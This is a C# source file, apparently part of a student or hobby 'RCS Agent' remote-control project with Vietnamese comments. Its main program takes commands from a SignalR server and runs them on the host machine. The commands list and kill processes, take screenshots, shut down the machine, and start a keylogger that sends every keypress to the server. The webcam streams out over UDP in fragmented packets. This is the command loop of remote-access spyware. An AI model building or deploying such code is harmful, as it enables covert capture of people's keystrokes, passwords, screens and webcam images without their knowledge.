using RCS.Agent.Services;
using RCS.Agent.Services.Windows;
using RCS.Common.Models;
using RCS.Common.Protocols;
using System.Net.Sockets;

namespace RCS.Agent
{
    class Program
    {
        private static SignalRClient _signalRClient;
        private static ApplicationManager _appManager;
        private static ProcessMonitor _processMonitor;
        private static SystemControl _systemControl;
        private static MediaCapture _mediaCapture;
        private static Keylogger _keylogger;
        
        private static CancellationTokenSource _webcamCts;
        private static UdpClient _udpClient; 
        
        // --- CẤU HÌNH ---
        private const string SERVER_UDP_HOST = "127.0.0.1"; 
        private const int SERVER_UDP_PORT = 6000;
        private const string AGENT_ID = "Agent_12345";
        private const string SERVER_URL = "http://localhost:5000/agenthub";

        private const int MAX_PACKET_SIZE = 45000; 
        private static int _frameSequence = 0; 

        static async Task Main(string[] args)
        {
            Console.Title = $"RCS Agent - {AGENT_ID}";
            InitializeServices();
            await _signalRClient.ConnectAsync(AGENT_ID);
            Console.WriteLine("Agent is running. Press CTRL+C to exit.");
            await Task.Delay(-1);
        }

        private static void InitializeServices()
        {
            _appManager = new ApplicationManager();
            _processMonitor = new ProcessMonitor();
            _systemControl = new SystemControl();
            _mediaCapture = new MediaCapture();
            _keylogger = new Keylogger();
            _signalRClient = new SignalRClient(SERVER_URL);
            _udpClient = new UdpClient();
            _signalRClient.OnCommandReceived += HandleCommand;
        }

        private static async Task HandleCommand(CommandMessage cmd)
        {
            Console.WriteLine($"[Command] {cmd.Action}");
            try
            {
                switch (cmd.Action)
                {
                    case ProtocolConstants.ActionAppList: await SendResponse(cmd.Action, _appManager.GetInstalledApps()); break;
                    case ProtocolConstants.ActionAppStart: _appManager.StartApp(GetParam(cmd, "name")); await SendResponse(cmd.Action, "started"); break;
                    case ProtocolConstants.ActionAppStop: _appManager.StopApp(GetParam(cmd, "name")); await SendResponse(cmd.Action, "stopped"); break;
                    case ProtocolConstants.ActionProcessList: await SendResponse(cmd.Action, _processMonitor.GetProcesses()); break;
                    case ProtocolConstants.ActionProcessStart: _processMonitor.StartProcess(GetParam(cmd, "name")); await SendResponse(cmd.Action, "started"); break;
                    case ProtocolConstants.ActionProcessStop: if(int.TryParse(GetParam(cmd, "pid"), out int pid)) _processMonitor.KillProcess(pid); await SendResponse(cmd.Action, "killed"); break;
                    case ProtocolConstants.ActionScreenshot: await _signalRClient.SendBinaryAsync(_mediaCapture.CaptureScreenBase64()); break;
                    case ProtocolConstants.ActionShutdown: _systemControl.Shutdown(); break;
                    case ProtocolConstants.ActionRestart: _systemControl.Restart(); break;
                    case ProtocolConstants.ActionKeyloggerStart: _keylogger.Start(async (key) => { await _signalRClient.SendUpdateAsync(new RealtimeUpdate { Event = "key_pressed", Data = key }); }); break;
                    case ProtocolConstants.ActionKeyloggerStop: _keylogger.Stop(); await SendResponse(cmd.Action, "stopped"); break;

                    case ProtocolConstants.ActionWebcamOn:
                        if (_webcamCts == null)
                        {
                            _webcamCts = new CancellationTokenSource();
                            _ = Task.Run(async () => await StreamWebcamLoop(_webcamCts.Token));
                        }
                        break;

                    case ProtocolConstants.ActionWebcamOff:
                        // 1. Hủy vòng lặp
                        _webcamCts?.Cancel();
                        _webcamCts = null;
                        
                        // 2. SỬA: Cưỡng chế tắt Camera ngay lập tức (không chờ vòng lặp thoát)
                        // Điều này giúp đèn Camera tắt ngay khi bấm nút
                        _mediaCapture.StopWebcam();
                        
                        Console.WriteLine("[Webcam] Force stopped.");
                        await SendResponse(cmd.Action, "stopped");
                        break;
                }
            }
            catch (Exception ex) { Console.WriteLine($"Error: {ex.Message}"); }
        }

        private static async Task StreamWebcamLoop(CancellationToken token)
        {
            Console.WriteLine("[Webcam] UDP High Quality Stream started...");
            
            if (!_mediaCapture.StartWebcam()) return;

            while (!token.IsCancellationRequested)
            {
                try
                {
                    // Lấy ảnh Raw Bytes
                    byte[] imageBytes = _mediaCapture.GetWebcamFrameBytes();
                    
                    if (imageBytes != null && imageBytes.Length > 0)
                    {
                        await SendFragmentedImage(imageBytes);
                    }
                    
                    await Task.Delay(40, token);
                }
                catch (TaskCanceledException) { break; }
                catch (ObjectDisposedException) { break; } // Bắt lỗi nếu object bị hủy ngang
                catch (Exception ex)
                {
                    // Chỉ log nếu không phải lỗi do hủy tác vụ
                    if (!token.IsCancellationRequested)
                        Console.WriteLine($"[Stream Error] {ex.Message}");
                }
            }
            // Đảm bảo tắt lần nữa khi thoát vòng lặp
            _mediaCapture.StopWebcam();
        }

        private static async Task SendFragmentedImage(byte[] imageBytes)
        {
            try 
            {
                int totalLength = imageBytes.Length;
                ushort totalPackets = (ushort)Math.Ceiling((double)totalLength / MAX_PACKET_SIZE);
                int frameId = Interlocked.Increment(ref _frameSequence);

                for (ushort i = 0; i < totalPackets; i++)
                {
                    int offset = i * MAX_PACKET_SIZE;
                    int size = Math.Min(MAX_PACKET_SIZE, totalLength - offset);

                    byte[] header = new byte[12];
                    BitConverter.GetBytes(frameId).CopyTo(header, 0);
                    BitConverter.GetBytes(i).CopyTo(header, 4);
                    BitConverter.GetBytes(totalPackets).CopyTo(header, 6);
                    BitConverter.GetBytes(size).CopyTo(header, 8);

                    byte[] packet = new byte[12 + size];
                    Array.Copy(header, 0, packet, 0, 12);
                    Array.Copy(imageBytes, offset, packet, 12, size);

                    await _udpClient.SendAsync(packet, packet.Length, SERVER_UDP_HOST, SERVER_UDP_PORT);
                    
                    if (i % 5 == 0) await Task.Delay(1); 
                }
            }
            catch { }
        }

        private static async Task SendResponse(string action, object data) { await _signalRClient.SendResponseAsync(new ResponseMessage { Action = action, Response = data }); }
        
        private static string GetParam(CommandMessage cmd, string key) {
             if (cmd.Params == null) return "";
            try 
            {
                if (cmd.Params is System.Text.Json.JsonElement jsonElement) { if (jsonElement.TryGetProperty(key, out var value)) return value.ToString(); }
                var str = cmd.Params.ToString();
                if (str.Contains(key)) {
                    var parts = str.Split(new[] { key, ":" }, StringSplitOptions.RemoveEmptyEntries);
                    for (int i = 0; i < parts.Length; i++) { if (parts[i].Contains(key) && i + 1 < parts.Length) return parts[i+1].Replace("}", "").Replace("\"", "").Replace(",", "").Trim(); }
                     if (parts.Length > 1) return parts[1].Replace("}", "").Replace("\"", "").Replace(",", "").Trim();
                }
            } catch { } return "";
        }
    }
}